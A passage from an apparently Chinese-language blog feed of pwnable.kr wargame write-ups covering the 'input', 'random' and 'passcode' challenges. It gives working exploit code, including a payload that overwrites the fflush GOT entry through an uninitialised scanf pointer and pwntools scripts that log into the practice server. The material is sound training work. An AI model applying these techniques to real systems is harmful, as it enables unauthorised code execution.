class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)]=<span class="string">&quot;&quot;</span></span><br><span class="line">argv[<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)]=<span class="string">&quot;\x20\x0a\x0d&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stdin</span></span><br><span class="line">r_i,w_i = os.pipe()</span><br><span class="line">r_e,w_e = os.pipe()</span><br><span class="line">os.write(w_i,<span class="string">&quot;\x00\x0a\x00\xff&quot;</span>)</span><br><span class="line">os.write(w_e,<span class="string">&quot;\x00\x0a\x02\xff&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#env</span></span><br><span class="line">env=&#123;<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>:<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#file</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;\x0a&quot;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;create file \x0a falid&quot;</span>)</span><br><span class="line">f.write(<span class="string">&quot;\x00\x00\x00\x00&quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">argv[<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]=<span class="string">b&#x27;5555&#x27;</span></span><br><span class="line"></span><br><span class="line">subprocess.Popen(argv,stdin=r_i,stderr=r_e,env=env)</span><br><span class="line"></span><br><span class="line"><span class="comment">#network</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">5555</span>))</span><br><span class="line">s.send(<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>)</span><br></pre></td></tr></table></figure><p>本地验证可以成功cat flag： <img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210827235440.png"></p><p> 下面就需要ssh链接后进心操作，我们通过scp，将exp文件(修改argv[0]对应input路径)上传到服务器中的tmp/imput/目录下(先ssh链接进入tmp下创建input目录，创建新目录是因为没有权限)，然后通过软链接把flag拷贝一份到tmp/input/下来使得可以cat flag：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">scp -P2222 ./input-local.py input2@pwnable.kr:/tmp/input/exp.py</span><br><span class="line"><span class="comment">#-P  大写</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210828002531.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  看提示信息，该题也是一个和input相关的题目，信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812163245.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    </summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之06-random</title>
    <link href="http://example.com/2021/08/16/pwnable/pwnable.kr%E7%B3%BB%E5%88%9706-random/"/>
    <id>http://example.com/2021/08/16/pwnable/pwnable.kr%E7%B3%BB%E5%88%9706-random/</id>
    <published>2021-08-15T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:39.619Z</updated>
    
    <content type="html"><![CDATA[<p>从描述信息来看，本道题是关于随机数的题目，提示信息如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812103001.png"></p><p>​    ssh登上查看文件及权限：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812105346.png"></p><p>​    查看random.c源代码并反汇编后分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">random = rand();<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good!\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Wrong, maybe you should try 2^32 cases.\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00000000004005f4 &lt;+0&gt;:push   rbp</span><br><span class="line">   0x00000000004005f5 &lt;+1&gt;:mov    rbp,rsp</span><br><span class="line">   0x00000000004005f8 &lt;+4&gt;:sub    rsp,0x10</span><br><span class="line">   0x00000000004005fc &lt;+8&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400601 &lt;+13&gt;:call   0x400500 &lt;rand@plt&gt;</span><br><span class="line">   0x0000000000400606 &lt;+18&gt;:mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">   0x0000000000400609 &lt;+21&gt;:mov    DWORD PTR [rbp-0x8],0x0</span><br><span class="line">   0x0000000000400610 &lt;+28&gt;:mov    eax,0x400760</span><br><span class="line">   0x0000000000400615 &lt;+33&gt;:lea    rdx,[rbp-0x8]</span><br><span class="line">   0x0000000000400619 &lt;+37&gt;:mov    rsi,rdx</span><br><span class="line">   0x000000000040061c &lt;+40&gt;:mov    rdi,rax</span><br><span class="line">   0x000000000040061f &lt;+43&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400624 &lt;+48&gt;:call   0x4004f0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000400629 &lt;+53&gt;:mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">&#x3D;&gt; 0x000000000040062c &lt;+56&gt;:xor    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">   0x000000000040062f &lt;+59&gt;:cmp    eax,0xdeadbeef</span><br><span class="line">   0x0000000000400634 &lt;+64&gt;:jne    0x400656 &lt;main+98&gt;</span><br><span class="line">   0x0000000000400636 &lt;+66&gt;:mov    edi,0x400763</span><br><span class="line">   0x000000000040063b &lt;+71&gt;:call   0x4004c0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400640 &lt;+76&gt;:mov    edi,0x400769</span><br><span class="line">   0x0000000000400645 &lt;+81&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000040064a &lt;+86&gt;:call   0x4004d0 &lt;system@plt&gt;</span><br><span class="line">   0x000000000040064f &lt;+91&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400654 &lt;+96&gt;:jmp    0x400665 &lt;main+113&gt;</span><br><span class="line">   0x0000000000400656 &lt;+98&gt;:mov    edi,0x400778</span><br><span class="line">   0x000000000040065b &lt;+103&gt;:call   0x4004c0 &lt;puts@plt&gt;</span><br><span class="line">   0x0000000000400660 &lt;+108&gt;:mov    eax,0x0</span><br><span class="line">   0x0000000000400665 &lt;+113&gt;:leave  </span><br><span class="line">   0x0000000000400666 &lt;+114&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><pre><code> 1.  cat flag条件是随机数random和key异或后未0xdeadbeef。 2.  key通过scanf()接收的，random为随机生成的四字节数，最开始想到是否可以给key赋值8个字节来覆盖random，但注意到scanf(&quot;%d&quot;,&amp;key)这里使用了%d坐限制，使得key只能被赋值为一个DWORD(四字节)，所以这个方案pass。 3.  继续分析发现，该题目并不是一个严格意义上的漏洞题，重点在于随机数random的生成。写过C代码就知道，rand()是伪随机的，正常使用情况下需要在rand()之前生成一个随机数种子(一般使用但钱时间作为随机数种子)作为rand()的参数来保证准确生成随机数。而这里直接使用rand()，随机数种子就是系统默认的1，会导致每次生成的random都是一个数。</code></pre><p>​       所以cat flag就简单了，调试一下random程序，得到变量random的值，然后逆运算即可得到key的值，random值存储在rbp-0x4处，本地调试和ssh远程调试得到的值都为：0x6b8b4567</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812155238.png"></p><p>​    key=0xdeadbeef ^ 0x6b8b4567 =3039230856</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812155605.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;从描述信息来看，本道题是关于随机数的题目，提示信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210812103001.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    ssh</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之05-passcode</title>
    <link href="http://example.com/2021/08/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/"/>
    <id>http://example.com/2021/08/15/pwnable/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/</id>
    <published>2021-08-14T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:32.426Z</updated>
    
    <content type="html"><![CDATA[<p>这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811101230.png"></p><p>​    还是通过ssh链接查看题目内容，ssh <a href="mailto:&#x70;&#x61;&#x73;&#115;&#99;&#111;&#100;&#101;&#x40;&#x70;&#119;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#x6b;&#114;">&#x70;&#x61;&#x73;&#115;&#99;&#111;&#100;&#101;&#x40;&#x70;&#119;&#x6e;&#x61;&#98;&#x6c;&#x65;&#x2e;&#x6b;&#114;</a> -p2222 (pw:guest)，题目里的东西还是老几样，重点关注文件权限：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811104304.png"></p><p>​    然后查看passcode.c源码，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> passcode1;</span><br><span class="line"><span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">welcome();</span><br><span class="line">login();</span><br><span class="line"></span><br><span class="line"><span class="comment">// something after login...</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><ol><li>从能成功flag处逆着看，首先要满足两个条件passcode1和psscode2的值为两个给定的值338150(0x528e6)和13371337(0xcc07c9)</li><li>passcode1和passcode2通过scanf()输入，但是这里程序写错，未使用&amp;来取变量地址，所以会把这两个变量的值直接作为地址来存储输入的内容，两个变量初始化时未赋值，所以值是随机的</li><li>要想利用，那么就要想办法覆盖passcode1和passcode2的值，来控制scanf()对任意地址写入数据。</li></ol><p><strong>解法思路：</strong></p><ol><li><p>welcome()和login()是两个连续调用的函数，所以对于栈空间的利用是会有部分重叠的，name限定了100字节的大小，可以考虑是否可以在这100个字节内修改道passcode1和passcode2的初始值，使其变得不随机。</p><p>这里先把passcode通过pwntools下载到本地进行调试(passcode.c和passcode有读取权限，而flag没有，所以想直接下载flag到本地是不可以的)，利用到的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">shell.download_file(<span class="string">&#x27;passcode&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ol><p>   下载后进行调试，已经分析过了，所以这里直接查看welcode和login反编译，查看到name和passcode1、passcode2的位置来计算偏移即可：</p><p>   welcode():</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x0804860c &lt;+3&gt;:sub    esp,0x88</span><br><span class="line">   0x08048612 &lt;+9&gt;:mov    eax,gs:0x14</span><br><span class="line">   0x08048618 &lt;+15&gt;:mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861b &lt;+18&gt;:xor    eax,eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:mov    eax,0x80487cb</span><br><span class="line">   0x08048622 &lt;+25&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048625 &lt;+28&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:mov    eax,0x80487dd</span><br><span class="line">   0x0804862f &lt;+38&gt;:lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048632 &lt;+41&gt;:mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048636 &lt;+45&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048639 &lt;+48&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:mov    eax,0x80487e3</span><br><span class="line">   0x08048643 &lt;+58&gt;:lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048646 &lt;+61&gt;:mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x0804864a &lt;+65&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804864d &lt;+68&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048655 &lt;+76&gt;:xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x0804865c &lt;+83&gt;:je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>​    login()：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:push   ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:mov    ebp,esp</span><br><span class="line">   0x08048567 &lt;+3&gt;:sub    esp,0x28</span><br><span class="line">   0x0804856a &lt;+6&gt;:mov    eax,0x8048770</span><br><span class="line">   0x0804856f &lt;+11&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048572 &lt;+14&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:mov    eax,0x8048783</span><br><span class="line">   0x0804857c &lt;+24&gt;:mov    edx,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x0804857f &lt;+27&gt;:mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048583 &lt;+31&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048586 &lt;+34&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:mov    eax,ds:0x804a02c</span><br><span class="line">   0x08048590 &lt;+44&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048593 &lt;+47&gt;:call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:mov    eax,0x8048786</span><br><span class="line">   0x0804859d &lt;+57&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485a0 &lt;+60&gt;:call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:mov    eax,0x8048783</span><br><span class="line">   0x080485aa &lt;+70&gt;:mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080485ad &lt;+73&gt;:mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080485b1 &lt;+77&gt;:mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485b4 &lt;+80&gt;:call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:mov    DWORD PTR [esp],0x8048799</span><br><span class="line">   0x080485c0 &lt;+92&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:cmp    DWORD PTR [ebp-0x10],0x528e6</span><br><span class="line">   0x080485cc &lt;+104&gt;:jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:cmp    DWORD PTR [ebp-0xc],0xcc07c9</span><br><span class="line">   0x080485d5 &lt;+113&gt;:jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:mov    DWORD PTR [esp],0x80487a5</span><br><span class="line">   0x080485de &lt;+122&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:mov    DWORD PTR [esp],0x80487af</span><br><span class="line">   0x080485ea &lt;+134&gt;:call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:mov    DWORD PTR [esp],0x80487bd</span><br><span class="line">   0x080485f8 &lt;+148&gt;:call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x08048604 &lt;+160&gt;:call   0x8048480 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>​    从反编译的代码中，可以看到name和passcode1相对于ebp的偏移分别为ebp-0x70、ebp-0x10。因为栈空间是平衡的，所以进入welcome()和login()后，ebp的位置在程序栈空间中都是一个地址。那么很容易我们可以在赋值name时先填充0x60的数据比如’A’，然后填充一个想要去赋值的四字节地址，就可以达到对任意地址的写入了。</p><p>​    接着分析，这种情况下就考虑直接去GOT中替换程序中用到的某个函数比如fflush()，即把passcode1替换为fflush()的地址，然后在scanf(“%d”,passcode1)时输入printf(“Login OK!\n”)所在地址，然后call fflush()时就可以直接跳过验证流程cat flag。</p><p>​    查看一下passcode开启的保护，并未开启NX，那就可以直接查地址使用即可，不用再leaklibc了：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811184424.png"></p><p>​    oledump找到fflush()地址：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185545.png"></p><p>​    构造exp，两种方式利用：</p><ul><li>ssh直接链接利用：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27;*0x60+&#x27;\x04\xa0\x04\x08&#x27;+str(0x080485d7)&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185732.png"></p><ul><li>使用pwntools利用：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">fflushAddr = <span class="number">0x0804a004</span></span><br><span class="line">loginAddr = <span class="number">0x080485d7</span></span><br><span class="line">p = shell.process(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p32(fflushAddr)+<span class="built_in">str</span>(loginAddr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185827.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811101230.p</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之04-flag</title>
    <link href="http://example.com/2021/08/14/pwnable/pwnable.kr%E7%B3%BB%E5%88%9704-flag/"/>
    <id>http://example.com/2021/08/14/pwnable/pwnable.kr%E7%B3%BB%E5%88%9704-flag/</id>
    <published>2021-08-13T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:20.502Z</updated>
    
